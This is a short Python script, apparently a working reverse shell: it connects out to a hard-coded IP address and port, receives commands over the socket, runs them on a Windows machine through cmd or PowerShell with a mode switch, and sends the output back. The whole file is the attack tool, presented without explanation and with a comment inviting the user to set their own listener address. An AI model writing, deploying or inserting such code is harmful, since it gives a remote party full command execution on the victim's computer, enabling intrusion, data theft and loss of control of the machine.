import socket
import subprocess

HOST = '192.168.50.39'  # Replace with your Linux host IP
PORT = 9999

mode = "cmd"  # Default to CMD mode

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((HOST, PORT))
    while True:
        data = s.recv(4096)
        if not data:
            break
        command = data.decode().strip()

        if command == 'lsw ps':
            mode = "ps"
            s.sendall(b"[LSW] Switched to PowerShell mode.\n")
            continue
        elif command == 'lsw cmd':
            mode = "cmd"
            s.sendall(b"[LSW] Switched to CMD mode.\n")
            continue

        try:
            if mode == "ps":
                output = subprocess.check_output(
                    ["powershell.exe", "-NoProfile", "-Command", command],
                    stderr=subprocess.STDOUT,
                    text=True
                )
            else:  # CMD mode
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    text=True
                )
        except subprocess.CalledProcessError as e:
            output = e.output

        s.sendall(output.encode())
